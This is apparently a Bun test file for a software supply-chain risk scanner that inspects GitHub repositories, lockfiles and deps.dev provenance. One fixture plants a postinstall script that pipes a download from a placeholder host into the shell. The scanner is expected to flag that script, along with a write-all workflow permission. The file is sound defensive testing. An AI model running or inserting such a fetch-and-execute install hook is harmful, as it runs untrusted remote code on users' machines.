import { describe, expect, test } from "bun:test";
import { GitHubRepositoryProvider } from "../src/providers/github-repository.ts";
import { DepsDevProvider, normalizeProvenance } from "../src/providers/deps-dev.ts";
import { RiskEngine } from "../src/domain/risk-engine.ts";
import { extractRiskFeatures, RISK_FEATURE_SCHEMA_VERSION } from "../src/domain/risk-features.ts";
import { RISK_SNAPSHOT_SCHEMA_VERSION, type RiskSnapshot } from "../src/domain/risk.ts";
import { partitionCompatibleRows } from "../src/domain/risk-evaluation.ts";

function response(value: unknown, status = 200): Response {
  return new Response(JSON.stringify(value), { status, headers: { "content-type": "application/json" } });
}
function content(value: string) { return { encoding: "base64", content: Buffer.from(value).toString("base64") }; }

const commitSha = "0123456789abcdef0123456789abcdef01234567";
const treeSha = "abcdef0123456789abcdef0123456789abcdef01";
const packageBlob = "1111111111111111111111111111111111111111";
const workflowBlob = "2222222222222222222222222222222222222222";

describe("repository evidence foundation", () => {
  test("resolves a mutable branch once and binds every security file read to its immutable commit", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const calls: string[] = [];
    const http = {
      async request(url: string | URL) {
        const target = String(url); calls.push(target);
        const fixtures: Record<string, unknown> = {
          [base]: { full_name: "acme/demo", default_branch: "main" },
          [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
          [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
            { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
            { path: ".github/workflows/release.yml", type: "blob", sha: workflowBlob, size: 100 }
          ] },
          [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" }, scripts: { postinstall: "curl https://bad.example/install | sh" } })),
          [`${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]: content("permissions: write-all\nsteps:\n  - uses: actions/checkout@v4\n")
        };
        return response(fixtures[target] ?? { message: "not found" }, fixtures[target] === undefined ? 404 : 200);
      }
    };

    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");

    expect(result.target).toEqual({ repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha });
    expect(result.coverage.status).toBe("partial");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "safe", requirement: "^1.2.0" }]);
    expect(result.securityFiles.flatMap(file => file.findings)).toEqual(expect.arrayContaining(["INSTALL_LIFECYCLE_SCRIPT", "DOWNLOAD_EXECUTE_PATTERN", "WORKFLOW_WRITE_PERMISSION", "MUTABLE_GITHUB_ACTION_REF"]));
    expect(calls).toEqual(expect.arrayContaining([`${base}/contents/package.json?ref=${commitSha}`, `${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]));
    expect(calls).not.toContain(`${base}/contents/package.json?ref=main`);
  });

  test("marks tree truncation and oversized files partial instead of claiming clean coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: true, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 999_999 }] }
      };
      const target = String(url); return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage).toMatchObject({ status: "partial", limitations: expect.arrayContaining(["github_tree_truncated", "security_file_oversized:package.json"]) });
    expect(result.securityFiles).toEqual([{ path: "package.json", category: "manifest", status: "oversized", findings: [] }]);
  });

  test("derives exact npm coordinates only from Bun lock resolution evidence", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const bunBlob = "3333333333333333333333333333333333333333";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }, { path: "bun.lock", type: "blob", sha: bunBlob, size: 100 }] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" } })),
        [`${base}/contents/bun.lock?ref=${commitSha}`]: content('"safe": ["safe@1.2.3", "", {}, "sha512-example"]')
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "safe", version: "1.2.3", sourcePath: "bun.lock" }]);
    expect(result.dependencies.unresolved).toEqual([]);
  });

  test("keeps deps.dev provenance states strict and source/commit mismatches visible", async () => {
    const urls: string[] = [];
    const http = { async json(url: string) { urls.push(url); return { licenses: ["MIT"], advisoryKeys: [{ id: "GHSA-example" }], slsaProvenances: [{ verified: true, sourceRepository: "github.com/acme/demo", commit: commitSha, url: "https://provenance.example/1" }] }; } };
    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json" }, { repository: "github.com/acme/demo", commit: commitSha });
    expect(urls).toContain("https://api.deps.dev/v3/systems/NPM/packages/demo/versions/1.0.0:dependencies");
    expect(observed.provenance[0]).toMatchObject({ state: "VERIFIED", expectedSourceMatches: true, expectedCommitMatches: true });
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/other/repo", commit: commitSha }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_SOURCE_MISMATCH");
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/acme/demo", commit: "1111111111111111111111111111111111111111" }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_COMMIT_MISMATCH");
  });

  test("preserves omni-risk-v1 score/recommendation with available or unavailable new evidence", () => {
    const base: RiskSnapshot = { subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "OpenSSF Scorecard", kind: "repository_security_practices", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] };
    const evidence = { target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha }, securityFiles: [{ path: "package.json", category: "manifest" as const, status: "inspected" as const, findings: ["INSTALL_LIFECYCLE_SCRIPT"] }], dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } }, provenance: [], coverage: { status: "complete" as const, treeEntriesInspected: 1, filesInspected: 1, bytesInspected: 10, limitations: [] }, sourceErrors: [] };
    const unavailable = { ...evidence, coverage: { ...evidence.coverage, status: "partial" as const, limitations: ["github_rate_limited"] }, sourceErrors: ["GitHub: github_rate_limited"] };
    const engine = new RiskEngine();
    const before = engine.assess(base);
    const available = engine.assess({ ...base, repositoryEvidence: evidence });
    const partial = engine.assess({ ...base, repositoryEvidence: unavailable });
    expect({ riskScore: available.riskScore, recommendation: available.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect({ riskScore: partial.riskScore, recommendation: partial.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect(available.signals.map(signal => signal.code)).toContain("INSTALL_LIFECYCLE_SCRIPT_OBSERVED");
    expect(partial.signals.map(signal => signal.code)).toContain("REPOSITORY_EVIDENCE_PARTIAL");
    expect(RISK_SNAPSHOT_SCHEMA_VERSION).toBe(2);
    expect(extractRiskFeatures({ ...base, repositoryEvidence: evidence }).schemaVersion).toBe(RISK_FEATURE_SCHEMA_VERSION);
  });

  test("keeps historical v1 rows separate from current compatible evaluation cohorts", () => {
    const rows = [{ snapshotSchemaVersion: 1, featureSchemaVersion: 1, id: "old" }, { snapshotSchemaVersion: 2, featureSchemaVersion: 2, id: "current" }];
    expect(partitionCompatibleRows(rows, RISK_SNAPSHOT_SCHEMA_VERSION, RISK_FEATURE_SCHEMA_VERSION)).toEqual({ compatible: [rows[1]!], incompatible: [rows[0]!], schemaVersionsPresent: { snapshot: [1, 2], feature: [1, 2] } });
  });
});
